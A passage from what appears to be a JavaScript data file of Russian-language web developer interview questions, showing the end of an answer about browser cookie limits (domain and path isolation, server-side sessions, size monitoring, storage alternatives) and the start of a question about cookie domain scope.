Domain=api.example.com\n\n// cdn.example.com - кэш данные  \nSet-Cookie: cacheKey=abc; Domain=cdn.example.com\n\n// auth.example.com - аутентификация\nSet-Cookie: session=123; Domain=auth.example.com</code></pre><p><strong>6. Использование Path для изоляции:</strong></p><pre><code>// Разные части приложения - разные пути\nSet-Cookie: adminData=xyz; Path=/admin\nSet-Cookie: shopData=abc; Path=/shop\nSet-Cookie: blogData=def; Path=/blog\n\n// Каждый раздел видит только свои cookies</code></pre><p><strong>7. Серверное хранение с ID:</strong></p><pre><code>// Клиент\ndocument.cookie = \"sessionId=abc123\"; // Всего ~20 байт\n\n// Сервер хранит все данные\nconst sessionData = {\n  userId: 123,\n  preferences: {...},\n  cart: [...],\n  history: [...]\n};\nredis.set('session:abc123', JSON.stringify(sessionData));</code></pre><p><strong>Best practices для управления cookies:</strong></p><ul><li>✅ Храните минимум данных в cookies</li><li>✅ Используйте короткие имена (user вместо currentUserIdentifier)</li><li>✅ Сжимайте данные если нужно хранить много</li><li>✅ Удаляйте cookies после использования</li><li>✅ Мониторьте количество и размер cookies</li><li>✅ Используйте localStorage для больших данных</li><li>✅ Храните на сервере, в cookies только ID</li><li>❌ Не дублируйте данные в разных cookies</li><li>❌ Не храните большие объекты</li><li>❌ Не создавайте десятки cookies для аналитики</li></ul><p><strong>Мониторинг и алерты:</strong></p><pre><code>// Проверка перед установкой критичной cookie\nfunction setImportantCookie(name, value) {\n  const stats = getCookieStats();\n  \n  if (stats.count >= 150) {\n    console.warn('Cookie limit approaching! Cleaning up...');\n    cleanupOldCookies();\n  }\n  \n  const size = new Blob([`${name}=${value}`]).size;\n  if (size > 4000) {\n    console.error('Cookie too large!', size);\n    // Сжать или использовать localStorage\n    localStorage.setItem(name, value);\n    return;\n  }\n  \n  document.cookie = `${name}=${value}; path=/`;\n}</code></pre><p><strong>Альтернативные решения:</strong></p><table><tr><th>Хранилище</th><th>Размер</th><th>Использование</th></tr><tr><td>Cookies</td><td>4KB × ~180</td><td>Auth, небольшие данные</td></tr><tr><td>localStorage</td><td>5-10MB</td><td>Настройки, кэш</td></tr><tr><td>sessionStorage</td><td>5-10MB</td><td>Временные данные</td></tr><tr><td>IndexedDB</td><td>~50MB-500MB</td><td>Большие данные, offline</td></tr><tr><td>Cache API</td><td>Зависит от диска</td><td>Кэш ресурсов</td></tr></table>",
    difficulty: 'middle',
    tags: ['cookie', 'лимиты', 'ограничения', 'размер', 'оптимизация']
  },
  {
    id: 28,
    question: "Как работают cookies с доменами и поддоменами? Что такое domain scope?",
];
